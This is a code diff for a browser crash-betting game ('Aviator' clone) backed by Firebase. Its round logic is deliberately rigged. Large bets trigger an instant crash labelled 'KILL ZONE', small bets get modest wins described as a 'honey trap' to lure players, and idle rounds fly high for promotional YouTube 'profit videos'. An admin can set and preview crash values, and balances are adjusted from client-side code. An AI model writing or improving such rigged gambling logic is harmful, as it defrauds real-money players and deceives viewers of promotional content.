@@ -80,7 +80,7 @@
     const firebaseConfig = { databaseURL: "https://jalwa-v2-ad222-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    const userId = localStorage.getItem('jalwa_user_phone') || "Guest";
+    const userId = localStorage.getItem('jalwa_user_phone') || "Guest_" + Math.floor(Math.random()*1000);
 
     let wallet = 0, multiplier = 1.0, gameStatus = "waiting", targetCrash = 2.0, serverOffset = 0, currentPeriod = "";
     let animationId;
@@ -95,40 +95,42 @@
         return { period: dateStr + String(Math.floor(totalSec/20)).padStart(4,'0'), ms: (totalSec % 20) * 1000 + now.getMilliseconds() };
     }
 
-    // --- HYBRID LOGIC (ADMIN + BOT) ---
+    // --- UPDATED HYBRID LOGIC ---
     async function calculateTarget() {
-        const adminSnap = await db.ref('gameSettings/aviator').once('value');
+        // Admin Master Check
+        const adminSnap = await db.ref('gameSettings/aviator/control').once('value');
         const admin = adminSnap.val();
         
-        // 1. Admin Control (For YouTube Profit Videos)
-        if (admin && admin.forceActive) return parseFloat(admin.manualCrash);
+        if (admin && admin.forceActive && admin.manualCrash > 0) {
+            return parseFloat(admin.manualCrash).toFixed(2);
+        }
 
-        // 2. Bot Logic
+        // Live Bet Tracking for Admin & Bot
         const betSnap = await db.ref('gameSettings/aviator/liveBets').once('value');
         let totalAmt = 0; let highBet = false;
         if (betSnap.exists()) {
             betSnap.forEach(snap => {
                 let amt = parseFloat(snap.val().amt);
                 totalAmt += amt;
-                if (amt >= 50) highBet = true; // Rule: 50+ bet = Instant Kill
+                if (amt >= 50) highBet = true; 
             });
         }
 
-        const userStats = await db.ref('users/' + userId + '/stats').once('value');
-        let count = (userStats.val() && userStats.val().totalBets) || 0;
-
-        if (highBet || totalAmt > 100 || count >= 5) {
-            return (Math.random() * 0.08 + 1.01).toFixed(2); // KILL ZONE
+        // BOT DECISION
+        if (highBet || totalAmt > 100) {
+            return (Math.random() * 0.08 + 1.01).toFixed(2); // Kill if big money
         } else if (totalAmt > 0) {
-            return (Math.random() * 1.5 + 2.1).toFixed(2); // HONEY TRAP (2x-3x)
+            return (Math.random() * 1.5 + 2.1).toFixed(2); // Small profit to lure
         } else {
-            return (Math.random() * 8 + 4).toFixed(2); // IDLE SHOW (4x-12x)
+            // IDLE FLY: Jab koi bet na ho tab bhi 4x-12x jaye for video
+            return (Math.random() * 8 + 4).toFixed(2); 
         }
     }
 
     async function updateNewRound() {
         targetCrash = await calculateTarget();
-        db.ref('gameSettings/aviator/liveBets').remove(); 
+        // Send to admin so he can see next crash
+        db.ref('gameSettings/aviator/control/currentTarget').set(targetCrash);
     }
 
     function triggerCrash() {
@@ -139,8 +141,8 @@
         
         [1,2].forEach(id => { if(bets[id].active) resetBtn(id); });
         db.ref('gameSettings/aviator/history').push(parseFloat(multiplier).toFixed(2));
+        db.ref('gameSettings/aviator/liveBets').remove(); // Clear bets for admin after crash
         
-        // Fast UI Reset
         setTimeout(() => { resetPlane(); document.getElementById('mult-text').style.color = "#fff"; }, 1500);
     }
 
@@ -149,10 +151,11 @@
         if (currentPeriod !== sync.period) { 
             currentPeriod = sync.period; document.getElementById('periodId').innerText = currentPeriod;
             updateNewRound(); 
+            gameStatus = "waiting";
         }
 
         if (sync.ms < 5000) {
-            gameStatus = "waiting"; multiplier = 1.0; 
+            multiplier = 1.0; 
             document.getElementById('mult-text').innerText = "WAITING " + (5 - (sync.ms/1000)).toFixed(1) + "s";
             [1,2].forEach(id => { if(!bets[id].waiting) resetBtn(id); });
         } else if (sync.ms < 17000) {
@@ -203,13 +206,14 @@
         if(gameStatus === "waiting" && !bets[id].waiting && wallet >= val) {
             db.ref('users/' + userId + '/stats/totalBets').transaction(c => (c || 0) + 1);
             db.ref('users/'+userId).transaction(u => { if(u) u.balance -= val; return u; });
-            db.ref('gameSettings/aviator/liveBets/' + userId + '_' + id).set({ amt: val });
+            // Direct path for Admin to track
+            db.ref('gameSettings/aviator/liveBets/' + userId).set({ amt: val, time: Date.now() });
             bets[id].amt = val; bets[id].waiting = true;
             document.getElementById('btn'+id).className = "main-btn waiting-btn"; document.getElementById('txt'+id).innerText = "WAITING";
         } else if(gameStatus === "running" && bets[id].active) {
             let win = bets[id].amt * multiplier;
             db.ref('users/'+userId).transaction(u => { if(u) u.balance += win; return u; });
-            db.ref('gameSettings/aviator/liveBets/' + userId + '_' + id).remove();
+            db.ref('gameSettings/aviator/liveBets/' + userId).remove();
             let p = document.getElementById('game-popup'); p.innerText = "WIN ₹" + win.toFixed(2); p.className = "popup-win";
             setTimeout(()=>p.className="", 2000); resetBtn(id);
         }
